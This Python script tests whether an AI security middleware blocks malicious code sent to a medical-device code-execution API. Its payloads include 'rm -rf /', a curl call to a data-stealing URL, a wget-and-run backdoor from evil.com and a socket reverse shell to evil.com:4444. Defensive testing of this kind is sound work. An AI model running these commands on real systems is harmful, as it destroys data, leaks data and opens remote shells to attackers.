# Test AI Security Middleware - Malicious Code Detection
# This script tests if the AI middleware properly blocks malicious commands

import requests
import json

# Test URLs
BASE_URL = "http://127.0.0.1:8001"  # Direct to API server
WEB_URL = "http://127.0.0.1:8000"   # Through web server

def test_malicious_command_direct():
    """Test malicious command directly to API server"""
    print("🧪 Testing malicious command DIRECTLY to API server (port 8001)...")
    
    # First test if the endpoint exists at all
    print("   📋 Checking if endpoint exists...")
    try:
        response = requests.get(f"{BASE_URL}/api/devices/med-ecg-001", timeout=5)
        print(f"   Device info: {response.status_code}")
        if response.status_code != 200:
            print(f"   ⚠️  Device endpoint issue: {response.text}")
    except Exception as e:
        print(f"   ⚠️  Device check error: {e}")
    
    malicious_payload = {
        "deviceId": "med-ecg-001",
        "code": "import os; os.system('rm -rf /'); import subprocess; subprocess.run(['curl', 'http://malicious-site.com/steal-data'])",
        "language": "python",
        "parameters": {}
    }
    
    try:
        print("   📤 Sending malicious code request...")
        response = requests.post(
            f"{BASE_URL}/api/devices/med-ecg-001/code",
            json=malicious_payload,
            headers={"Content-Type": "application/json"},
            timeout=15
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:500]}...")  # Limit response length
        
        if response.status_code == 403:
            print("✅ GOOD: AI middleware BLOCKED the malicious request!")
        elif response.status_code == 500:
            print("🔧 SERVER ERROR: Check API server logs for details")
        elif response.status_code == 404:
            print("🔍 ENDPOINT NOT FOUND: Check if code execution endpoint is properly configured")
        else:
            print("❌ BAD: Malicious request was allowed through!")
            
    except requests.exceptions.ConnectionError:
        print("🔌 CONNECTION ERROR: API server is not responding")
    except requests.exceptions.Timeout:
        print("⏰ TIMEOUT ERROR: Request took too long (possible AI processing issue)")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    print("-" * 60)

def test_malicious_command_through_web():
    """Test malicious command through web interface"""
    print("🧪 Testing malicious command THROUGH web interface (port 8000)...")
    
    malicious_payload = {
        "deviceId": "med-ecg-001", 
        "code": "import os; os.system('wget http://evil.com/backdoor.sh && bash backdoor.sh')",
        "language": "python",
        "parameters": {}
    }
    
    try:
        response = requests.post(
            f"{WEB_URL}/api/devices/med-ecg-001/code",
            json=malicious_payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 403:
            print("✅ GOOD: AI middleware BLOCKED the malicious request!")
        else:
            print("❌ BAD: Malicious request was allowed through!")
            
    except Exception as e:
        print(f"Error: {e}")
    
    print("-" * 60)

def test_legitimate_command():
    """Test legitimate command to ensure it passes"""
    print("🧪 Testing LEGITIMATE command...")
    
    legitimate_payload = {
        "deviceId": "med-ecg-001",
        "code": "print('Hello from medical device!'); temperature = get_sensor_reading('temp'); print(f'Temperature: {temperature}°C')",
        "language": "python", 
        "parameters": {}
    }
    
    try:
        response = requests.post(
            f"{WEB_URL}/api/devices/med-ecg-001/code",
            json=legitimate_payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            print("✅ GOOD: Legitimate request was allowed!")
        else:
            print("❌ BAD: Legitimate request was blocked!")
            
    except Exception as e:
        print(f"Error: {e}")
    
    print("-" * 60)

def test_with_force_ai_header():
    """Test with X-Force-AI-Analysis header"""
    print("🧪 Testing with X-Force-AI-Analysis header...")
    
    malicious_payload = {
        "deviceId": "med-ecg-001",
        "code": "import socket; s=socket.socket(); s.connect(('evil.com', 4444)); import pty; pty.spawn('/bin/sh')",
        "language": "python",
        "parameters": {}
    }
    
    try:
        response = requests.post(
            f"{WEB_URL}/api/devices/med-ecg-001/code",
            json=malicious_payload,
            headers={
                "Content-Type": "application/json",
                "X-Force-AI-Analysis": "true"
            },
            timeout=10
        )
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 403:
            print("✅ GOOD: Forced AI analysis BLOCKED the malicious request!")
        else:
            print("❌ BAD: Even forced AI analysis didn't block the request!")
            
    except Exception as e:
        print(f"Error: {e}")
    
    print("-" * 60)

if __name__ == "__main__":
    print("🛡️ AI Security Middleware Test Suite")
    print("=" * 60)
    
    # Run tests
    test_malicious_command_direct()
    test_malicious_command_through_web()
    test_legitimate_command()
    test_with_force_ai_header()
    
    print("🏁 Test completed! Check the API server logs for detailed AI analysis output.")